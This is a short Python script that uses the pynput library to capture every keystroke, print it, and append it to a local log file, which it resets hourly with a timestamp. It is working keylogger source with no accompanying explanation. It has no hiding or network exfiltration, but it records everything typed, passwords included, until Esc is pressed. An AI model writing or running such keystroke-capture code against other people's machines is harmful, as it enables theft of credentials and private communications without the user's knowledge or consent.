from pynput import keyboard
import threading
import datetime

key_list = []

def key_pressed(key):
    global key_list
    try:
        key_list.append(key)
        log_keys(key_list)
    except Exception as e:
        print(f"Error: {e}")

def key_released(key):
    if key == keyboard.Key.esc:
        return False

def log_keys(list_of_keys):
    with open("log.txt", "a") as log_file:
        for k in list_of_keys:
            result = str(k).replace("'", '')
            print(result)
            log_file.write(result + ' ')
        list_of_keys.clear()
        
def format_log_file():
    with open("log.txt","w") as log_file:
        log_file.write(f"log started at {datetime.datetime.now()}\n")
        threading.Timer(3600, format_log_file).start() 

format_log_file()               

with keyboard.Listener(on_press=key_pressed, on_release=key_released) as listener:
    listener.join()
    
   
    
    
    
